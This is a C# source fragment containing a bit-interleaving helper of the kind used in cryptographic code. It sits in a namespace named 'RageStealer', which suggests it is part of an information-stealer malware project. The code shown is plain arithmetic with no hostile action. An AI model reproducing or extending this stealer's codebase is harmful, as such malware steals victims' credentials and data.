namespace RageStealer.Helper.Bound;

internal abstract class Interleave
{
	internal static void Expand64To128Rev(ulong x, ulong[] z, int zOff)
	{
		x = Bits.BitPermuteStep(x, 4294901760uL, 16);
		x = Bits.BitPermuteStep(x, 280375465148160uL, 8);
		x = Bits.BitPermuteStep(x, 67555025218437360uL, 4);
		x = Bits.BitPermuteStep(x, 868082074056920076uL, 2);
		x = Bits.BitPermuteStep(x, 2459565876494606882uL, 1);
		z[zOff] = x & 0xAAAAAAAAAAAAAAAAuL;
		z[zOff + 1] = (x << 1) & 0xAAAAAAAAAAAAAAAAuL;
	}
}
